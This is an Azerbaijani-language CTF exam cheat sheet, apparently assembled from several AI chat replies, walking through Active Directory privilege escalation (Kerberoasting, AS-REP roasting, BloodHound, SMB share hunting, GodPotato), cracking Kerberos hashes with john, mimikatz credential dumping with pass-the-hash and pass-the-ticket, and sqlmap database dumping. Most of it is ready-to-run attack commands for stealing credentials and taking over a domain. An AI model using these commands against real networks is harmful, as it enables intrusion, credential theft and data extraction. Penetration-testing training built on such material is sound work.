Active Directory (AD) mühitində sıravi istifadəçi hüquqlarından ən yüksək səviyyəli hüquqa — yəni Windows terminologiyası ilə **Domain Admin** (və ya bəzən yerəl maşında Administrator/SYSTEM) statusuna — yüksəlmək üçün növbəti mərhələ yetkilərin artırılması (**Privilege Escalation**) mərhələsidir.

CTF imtahanlarında ilkin istifadəçi məlumatları (credentials) əldə edildikdən sonra yüksək hüquqlar qazanmaq üçün ən çox istifadə olunan və yoxlanılması vacib olan klassik AD hücum metodları bunlardır:

---

### 1. Kerberoasting (Sıravi İstifadəçi Hüququ ilə)

Əgər əlinizdə hər hansı bir valid (düzgün) istifadəçi məlumatı varsa, sistemdəki Service Principal Name (SPN) qeydiyyatı olan xidmət hesablarının Kerberos biletlərini (TGS) istəyə bilərsiniz. Bu biletlər şifrələnmiş olur və onları lokal mühitdə sındırmaq (crack etmək) mümkündür.

* **`NetExec` ilə Kerberoasting yoxlamaq:**
```bash
netexec smb <Hədəf_IP> -u 'istifadəçi' -p 'şifrə' --kerberoasting output.txt

```


* **`Impacket` (`GetUserSPNs.py`) ilə biletləri çəkmək:**
```bash
GetUserSPNs.py -dc-ip <Hədəf_IP> domen.local/istifadəçi:şifrə -request -outputfile hashes.txt

```


*Əgər buradan bir hash əldə etsəniz, onu `john` və ya `hashcat` aləti ilə sındıraraq həmin xidmət hesabının şifrəsini tapa bilərsiniz. Bu hesablar çox vaxt yüksək imtiyazlara sahib olur.*

---

### 2. BloodHound ilə Hücum Yollarının Analizi

Active Directory daxilində hüquqların yüksəldilməsi yollarını vizual olaraq görmək üçün ən effektiv üsul BloodHound alətidir. O, istifadəçilər, qruplar və maşınlar arasındakı əlaqələri analiz edir.

* **Məlumatların toplanması (`bloodhound-python` ilə):**
```bash
bloodhound-python -u 'istifadəçi' -p 'şifrə' -d domen.local -dc domen-controller-adı.domen.local -c All

```


*Bu əmr nəticəsində bir neçə `.json` faylı yaranacaq. Bu faylları BloodHound interfeysinə yükləyərək "Shortest Paths to High Privileged Groups" (Yüksək imtiyazlı qruplara gedən ən qısa yollar) sorğusunu işlədib hansı istifadəçinin hara icazəsi olduğunu vizual görə bilərsiniz.*

---

### 3. AS-REP Roasting (Şifrəsiz İstifadəçilər)

Bəzi istifadəçi hesablarında "Do not require Kerberos preauthentication" (Kerberos ilkin autentifikasiyası tələb olunmasın) konfiqurasiyası aktiv olur. Bu zaman həmin istifadəçilərin şifrə hash-lərini heç bir şifrə bilmədən birbaşa çəkmək olar.

* **`Impacket` (`GetNPUsers.py`) ilə yoxlamaq:**
```bash
GetNPUsers.py domen.local/ -dc-ip <Hədəf_IP> -no-pass -usersfile users.txt

```


*(Buradakı `users.txt` əvvəlki mərhələdə `ldapsearch` və ya `netexec` ilə tapdığınız istifadəçi adlarının siyahısıdır).*

---

### 4. Şəbəkə Paylaşımlarında (Shares) Şifrə Axtarışı

Bəzən daxili şəbəkədə hamıya açıq paylaşılan qovluqlarda (məsələn, `SYSVOL` qovluğunda və ya skript arxivlərində) administrator şifrələri unudulur (məsələn, Group Policy Preferences - GPP boşluğu).

* **Paylaşılan qovluqların içində axtarış:**
```bash
netexec smb <Hədəf_IP> -u 'istifadəçi' -p 'şifrə' --shares

```


Əgər yazma/oxuma icazəniz olan maraqlı qovluqlar (məsələn, `Backup`, `Scripts`, `SYSVOL`) varsa, `smbclient` ilə daxil olub konfiqurasiya fayllarını yoxlaya bilərsiniz:
```bash
smbclient //<Hədəf_IP>/qovluq_adı -U 'istifadəçi'

```



---

### 5. Yerəl Maşında Hüquqların Artırılması (Lokal Privilege Escalation)

Əgər tapdığınız istifadəçi ilə `Evil-WinRM` və ya SSH vasitəsilə sistemə daxil ola bilmisinizsə, həmin lokal maşında Administrator (SYSTEM) olmaq üçün aşağıdakıları yoxlayın:

* **İstifadəçinin privileges (imtiyazlarını) yoxlamaq:**
```cmd
whoami /priv

```


*Əgər nəticədə `SeImpersonatePrivilege`, `SeBackupPrivilege` və ya `SeTakeOwnershipPrivilege` görsəniz, bu imtiyazlardan istifadə edərək sistemi asanlıqla `SYSTEM` hüququna qaldıra bilərsiniz (məsələn, `SeImpersonate` üçün `PrintSpoofer` və ya `GodPotato` alətləri istifadə olunur).*
* **Avtomatlaşdırılmış skriptlər işlətmək:**
Sistemə daxil olduqdan sonra `WinPEAS.exe` skriptini hədəf maşına yükləyib işlədərək, sistemdəki zəif konfiqurasiyaları (məsələn, unquoted service paths, unencrypted passwords) avtomatik aşkar edə bilərsiniz.






Bəli, `impacket-GetUserSPNs` və ya `impacket-GetNPUsers` əmrləri ilə əldə etdiyiniz Kerberos hash-lərini `hashcat` istifadə etmədən, digər ən populyar alət olan **John the Ripper (`john`)** ilə çox rahat şəkildə sındıra bilərsiniz.

`john` alətinin ən böyük üstünlüklərindən biri odur ki, o, hash-in növünü çox vaxt avtomatik tanıyır və xüsusi rejim kodu (məsələn, hashcat-dəki `-m 13100` kimi) yazmağınızı tələb etmir.

Kerberos hash-lərini `john` ilə sındırmaq üçün aşağıdakı addımları izləyə bilərsiniz:

### 1. Kerberoasting (TGS-REP) Hash-lərini Sındırmaq

Əgər `impacket-GetUserSPNs` ilə əldə etdiyiniz və daxilində `$krb5tgs$` sözü keçən hash-ləri sındırmaq istəyirsinizsə, Kali Linux-da standart olaraq gələn `RockYou` söz siyahısından (wordlist) istifadə edərək bu əmri yazın:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

```

*Əgər `john` hash növünü avtomatik tanımaqda çətinlik çəksə, formatı əllə məcburi təyin edə bilərsiniz:*

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

```

---

### 2. AS-REP Roasting Hash-lərini Sındırmaq

Əgər `impacket-GetNPUsers` ilə əldə etdiyiniz və daxilində `$krb5asrep$` sözü olan (şifrə tələb etməyən istifadəçilərin) hash-lərini sındırmaq istəyirsinizsə:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

```

*Formatı əllə təyin etmək ehtiyacı yaranarsa:*

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

```

---

### 3. Tapılmış Şifrəyə Baxmaq (Show)

Əgər `john` arxa fonda işini bitiribsə və ya şifrə artıq tapılıbsa, lakin siz terminalda onu qaçırmısınızsa, tapılan şifrəni ekranda göstərmək üçün `--show` parametrindən istifadə edin:

```bash
john --show hashes.txt

```

### Alternativ Olaraq: Şifrəni Onlayn Sındırmaq (Əgər internet varsa)

Əgər imtahan mühitindən xarici internetə çıxışınız varsa və ya hash-i öz kompüterinizə köçürə bilirsinizsə, **CrackStation** kimi onlayn bazalardan istifadə edə bilərsiniz. Lakin yadda saxlayın ki, onlayn xidmətlər adətən sadə NTLM və ya MD5 hash-lərini yaxşı tapır, Kerberos biletlərinin strukturunu hər sayt dəstəkləməyə bilər. Buna görə imtahanda ən etibarlı yol lokal olaraq `john` və ya `hashcat` işlətməkdir.





Düzgün qeyd etdiniz, üzrlü sayın. Mən yuxarıda həm `mimikatz` daxilindəki əmrləri, həm də onun açdığı standart Windows terminalındakı əmrləri qarışıq yazdım və bu çaşqınlıq yaratdı. Gəlin imtahanda birbaşa **`mimikatz` terminalının öz içində** edəcəyiniz addımları tam dəqiq və ardıcıl yazaq.

Əgər siz maşında `GodPotato` ilə artıq administrator (SYSTEM) olmusunuzsa, `mimikatz`-ı işlədirsiniz. Qarşınızda `mimikatz #` sətri açılır. Proses tam olaraq bu 3 addımdan ibarətdir:

### 1. Sistem Yaddaşından Hash-ləri Çıxarmaq

`mimikatz #` sətrində ardıcıl olaraq bu iki əmri yazırsınız:

```cmd
privilege::debug
sekurlsa::logonpasswords

```

Bu əmrlərin nəticəsində ekranda böyük bir siyahı çıxacaq. Orada `Domain Admin` (məsələn, Administrator) istifadəçisini tapıb onun qarşısındakı **NTLM hash-ini** köpylayırsınız.

### 2. Mimikatz ilə Bilet Yaradıb Yeni Terminal Açmaq (Overpass-the-Hash)

İndi isə əlimizdəki o NTLM hash ilə Kerberos bileti (Ticket) yaratmaq üçün **yenə `mimikatz #` sətrində** bu əmri icra edirik:

```cmd
sekurlsa::pth /user:Administrator /domain:domen.local /ntlm:TAPILAN_NTLM_HASHI /run:cmd.exe

```

* **Bu əmr nə edir?** `mimikatz` həmin NTLM hash-i istifadə edərək arxa fonda Kerberos xidmətindən qanuni bir bilet (TGT) tələb edir və həmin biletin aktiv olduğu yeni bir Windows terminalı (`cmd.exe`) açır.

### 3. Açılan Yeni Terminalda Flag-ı Oxumaq

Ekranda avtomatik olaraq **yeni bir qara terminal** açılacaq. **Bax bu terminalın içində** siz artıq şəbəkədə `Domain Admin` hüququna sahibsiniz.

Həmin yeni açılan terminalda Domen Controller serverinin (`C$` paylaşımına) daxil olub flag-ı birbaşa oxuyursunuz:

```cmd
type \\DomenController_IP_ve_ya_Adi\C$\Users\Administrator\Desktop\root.txt

```

---

### Alternativ Variant: Biletləri Birbaşa Mimikatz ilə "Inject" Etmək (Pass-the-Ticket)

Əgər hash ilə deyil, yaddaşda olan hazır `.kirbi` bilet faylları ilə etmək istəyirsinizsə, tam olaraq `mimikatz`-ın içində edilən ardıcıllıq belədir:

1. **Yaddaşdakı biletləri diskə çıxarmaq (`mimikatz` içində):**
```cmd
privilege::debug
standard::elevation
kerberos::list /export

```


*Bu, olduğunuz qovluğa çoxlu `.kirbi` faylları atacaq. Oradan Domain Admin-ə aid olan faylın adını kopyalayırsınız.*
2. **Bileti cari sessiyaya yükləmək (`mimikatz` içində):**
```cmd
kerberos::ptt "bilet_faylinin_tam_adi.kirbi"

```


*Bu əmri yazdıqdan sonra `mimikatz` sizə `OK` mesajı verəcək.*
3. **İndi isə mimikatz-dan çıxmadan birbaşa onun içindən əmr göndərmək:**
Bilet artıq `mimikatz`-ın olduğu sessiyaya yükləndiyi üçün, elə mimikatz-ın içində `misc::cmd` yazaraq və ya birbaşa flag-ı oxumaq olar:
```cmd
misc::cmd

```


Açılan terminalda yenə:
```cmd
type \\DomenController_IP\C$\Users\Administrator\Desktop\root.txt

```







CTF (Capture The Flag) yarışlarında Active Directory istifadəçilərinin description (təsvir) sahəsində olan məlumatları tapmaq və həmin məlumatlarla flag-i əldə etmək üçün istifadə olunan real, konseptual komandaları aşağıdakı ardıcıllıqla tətbiq edə bilərsiniz.

Yarış mühitindən asılı olaraq əlinizdə bir Linux (məsələn, Kali Linux) və ya şəbəkəyə daxil edilmiş bir Windows maşını ola bilər. Hər iki mühit üçün effektiv komandalar bunlardır:

---

### 1. AD İstifadəçilərinin "Description" Sahələrini Skan Etmək

Məqsəd, bazadakı bütün istifadəçilərin təsvir sahələrini çəkib daxilində "password", "pass", "admin", "flag" kimi sözləri filtrləməkdir.

#### Linux Mühitində (İmpacket və ya Netexec/CrackMapExec ilə):

Əgər əlinizdə şəbəkəyə daxil olmaq üçün ilkin bir aşağı imtiyazlı istifadəçi adı (`user`) və parolu (`pass`) varsa:

```bash
# BloodHound üçün məlumat toplamaq (çox vaxt təsvirləri daxilində göstərir)
bloodhound-python -u 'username' -p 'password' -d domain.local -dc dc.domain.local -c All

# crackmapexec və ya nxc vasitəsilə istifadəçilərin təsvirlərini oxumaq
nxc ldap 10.10.10.xx -u 'username' -p 'password' --users
# (Bu komanda istifadəçilərin siyahısını və description sahələrini ekrana çıxaracaq)

# LDAP üzərindən birbaşa sorğu göndərmək (ldapsearch ilə)
ldapsearch -x -H ldap://10.10.10.xx -D "username@domain.local" -w "password" -b "DC=domain,DC=local" "(description=*)" description sAMAccountName

```

#### Windows Mühitində (PowerShell ilə):

Əgər artıq bir Windows maşınına daxil olmusunuzsa, PowerShell vasitəsilə AD modulundan və ya ADSISearcher-dən istifadə edə bilərsiniz:

```powershell
# ActiveDirectory Modulu mövcuddursa:
Get-ADUser -Filter * -Properties Description | Select-Object Name, Description | Where-Object {$_.Description -like "*pass*" -or $_.Description -like "*admin*"}

# Modul yoxdursa (Təmiz PowerShell ADSI ilə):
$searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(description=*))"
$searcher.FindAll() | ForEach-Object {
    New-Object PSObject -Property @{
        Name = $_.Properties.samaccountname
        Description = $_.Properties.description
    }
}

```

---

### 2. Tapılan Hesabın Hüquqlarını və "Flag"-i Yoxlamaq

Təsvir sahəsində tapdığınız istifadəçi adı və parolu ilə root flag-ni əldə etmək üçün həmin hesabın hara daxil ola bildiyini yoxlamalısınız. CTF-lərdə çox vaxt bu hesablara Admin resurslarına giriş icazəsi verilir.

#### Şəbəkə Paylaşımlarını (SMB Shares) Yoxlamaq:

Yüksək imtiyazlı hesablar çox vaxt `C$` (bütün diskin idarəçi paylaşımı) və ya `ADMIN$` qovluqlarına daxil ola bilir. Flag adətən Administratorun masaüstündə (`C:\Users\Administrator\Desktop\root.txt`) olur.

Linux-dan bu paylaşımlara birbaşa daxil olub faylı oxumaq üçün:

```bash
# crackmapexec/nxc ilə C$ paylaşımına girişin olub-olmadığını yoxlamaq
nxc smb 10.10.10.xx -u 'Tapılan_User' -p 'Tapılan_Parol' --shares

# Əgər C$ üzərində "READ" və ya "WRITE" (Pwn3d!) görsəniz, smbclient ilə daxil olmaq:
smbclient //10.10.10.xx/C$ -U 'domain.local\Tapılan_User%Tapılan_Parol'

# Daxil olduqdan sonra flag-in yerinə getmək:
cd Users\Administrator\Desktop
get root.txt

```

#### PowerShell Remoting (WinRM) vasitəsilə daxil olmaq:

Əgər tapılan hesabla sistemə tam idarəçi terminalı açmaq mümkündürsə (məsələn, hesaba `Remote Management Users` və ya `Administrators` hüququ verilibsə):

```bash
# Linux-dan WinRM vasitəsilə terminal bağlantısı qurmaq
evil-winrm -i 10.10.10.xx -u 'Tapılan_User' -p 'Tapılan_Parol'

# Bağlantı uğurlu olarsa, birbaşa terminal açılacaq və əmrləri icra edə bilərsiniz:
type C:\Users\Administrator\Desktop\root.txt

```

---

### CTF üçün Qısa Strategiya Özəti:

1. İlkin istifadəçi ilə `nxc ldap <IP> -u user -p pass --users` komandasını icra edin.
2. Çıxan siyahıda `Description` sütununda yazılan qeydləri diqqətlə oxuyun (məsələn: *“Password set to Admin123! temporarily”*).
3. Tapdığınız yeni məlumatları `evil-winrm` və ya `smbclient` komandalarında yoxlayaraq Administrator qovluğuna keçid edib flag-i oxuyun.





SQL injection (SQLi) zəifliklərini analiz etmək və verilənlər bazasındakı məlumatları çıxarmaq (dump etmək) üçün `sqlmap` alətinin ən çox istifadə olunan əmrlərinin "cheat sheet" (köməkçi təlimat) variantı aşağıdakı kimidir.

İmtahanda və ya laboratoriyada vaxta qənaət etmək üçün addım-addım (pilləli) irəliləmək və hər mərhələdə əldə edilən məlumatı növbəti əmrə daxil etmək lazımdır.

---

### 1. İlkin Yoxlama (Zəifliyin təsdiqlənməsi)

Hədəf URL-də SQL injection olub-olmadığını və hansı bazadan (MySQL, MSSQL, PostgreSQL və s.) istifadə edildiyini yoxlamaq üçün:

```bash
sqlmap -u "http://example.com/pages.php?id=1" --batch

```

* `--batch`: Proqramın qarşıya çıxan suallara avtomatik olaraq standart (default) "bəli" cavabını verməsini təmin edir, vaxt qazandırır.

---

### 2. Verilənlər Bazalarının (Database) Siyahısını Çəkmək

Sistemdə mövcud olan bütün verilənlər bazalarının adlarını görmək üçün:

```bash
sqlmap -u "http://example.com/pages.php?id=1" --dbs --batch

```

*Bu əmrin nəticəsində sizə `target_db`, `information_schema` kimi baza adları qayıdacaq.*

---

### 3. Seçilmiş Bazanın Cədvəllərini (Tables) Siyahılamaq

Məsələn, yuxarıdakı addımda maraqlı görünən bazanın adının `target_db` olduğunu gördünüz. İndi həmin bazanın daxilindəki cədvəlləri çıxarmaq lazımdır:

```bash
sqlmap -u "http://example.com/pages.php?id=1" -D target_db --tables --batch

```

*Bu əmrin nəticəsində `users`, `products`, `flags` kimi cədvəl adları çıxacaq.*

---

### 4. Seçilmiş Cədvəlin Sütunlarını (Columns) Görmək

Məsələn, `users` və ya `flags` cədvəlinin daxilində hansı sütunların (məsələn: username, password, flag_id) olduğunu öyrənmək üçün:

```bash
sqlmap -u "http://example.com/pages.php?id=1" -D target_db -T users --columns --batch

```

---

### 5. Məlumatların Tam Çıxarılması (Dump Etmək)

Artıq baza (`-D`), cədvəl (`-T`) və sütunların (`-C`) adlarını bildiyiniz üçün lazımi məlumatları ekrana və ya fayla yazdırmaq (dump) olar:

* **Spesifik sütunları dump etmək (Tövsiyə olunan):**
```bash
sqlmap -u "http://example.com/pages.php?id=1" -D target_db -T users -C username,password --dump --batch

```


* **Bütöv bir cədvəli tam olaraq dump etmək:**
```bash
sqlmap -u "http://example.com/pages.php?id=1" -D target_db -T flags --dump --batch

```


* **Bütün bazanı birdəfəlik dump etmək (Baza böyükdürsə vaxt apara bilər):**
```bash
sqlmap -u "http://example.com/pages.php?id=1" -D target_db --dump-all --batch

```



---

### İmtahanda Qarşılaşa Biləcəyiniz Xüsusi Hallar Üçün Əmrlər

* **POST Sorğularını Yoxlamaq (Login formaları və s.):**
Əgər zəiflik GET parametrində deyil, POST sorğusundadırsa, Burp Suite vasitəsilə sorğunu tutub fayl kimi (məsələn `request.txt`) yadda saxlayın və bu əmri işlədin:
```bash
sqlmap -r request.txt --dbs --batch

```


* **Autentifikasiya (Cookie) Tələb Olunan Səhifələr:**
Əgər flag-ı tapmaq üçün daxil olduğunuz istifadəçi sessiyasının daxilində axtarış edirsinizsə, Cookie dəyərini mütləq daxil etməlisiniz:
```bash
sqlmap -u "http://example.com/profile.php?id=5" --cookie="PHPSESSID=12345abcde" --dbs

```


* **Sürəti və Səviyyəni Artırmaq (Zəiflik çətin tapıldıqda):**
Əgər standart sorğular nəticə vermirsə, sqlmap-ın yoxlama riskini və səviyyəsini artırmaq olar:
```bash
sqlmap -u "http://example.com/pages.php?id=1" --level=5 --risk=3 --dbs --batch

```
